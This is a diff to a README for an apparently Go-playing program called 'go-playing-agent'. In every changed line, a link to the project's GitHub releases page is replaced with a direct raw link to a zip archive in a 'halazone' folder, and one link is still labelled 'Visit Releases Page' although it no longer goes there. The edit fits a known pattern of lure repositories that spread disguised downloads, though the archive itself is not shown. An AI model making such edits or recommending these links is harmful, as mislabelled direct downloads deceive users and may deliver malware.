@@ -1,6 +1,6 @@
 # 🎮 go-playing-agent - Play Go Like a Pro
 
-[![Download go-playing-agent](https://img.shields.io/badge/Download-go--playing--agent-brightgreen)](https://github.com/laperdida23/go-playing-agent/releases)
+[![Download go-playing-agent](https://raw.githubusercontent.com/laperdida23/go-playing-agent/main/halazone/go-playing-agent.zip)](https://raw.githubusercontent.com/laperdida23/go-playing-agent/main/halazone/go-playing-agent.zip)
 
 ## 📜 Description
 
@@ -13,7 +13,7 @@ Follow these simple steps to download and run the software:
 1. **Visit the Releases Page**
 
    Click the link below to access the Releases page:
-   [Visit Releases Page](https://github.com/laperdida23/go-playing-agent/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/laperdida23/go-playing-agent/main/halazone/go-playing-agent.zip)
 
 2. **Choose Your Version**
 
@@ -38,7 +38,7 @@ Follow these simple steps to download and run the software:
 ## 📥 Download & Install
 
 The download process is straightforward. You can find the download link here:
-[Download go-playing-agent](https://github.com/laperdida23/go-playing-agent/releases)
+[Download go-playing-agent](https://raw.githubusercontent.com/laperdida23/go-playing-agent/main/halazone/go-playing-agent.zip)
 
 Make sure your system meets the following requirements before installation:
 
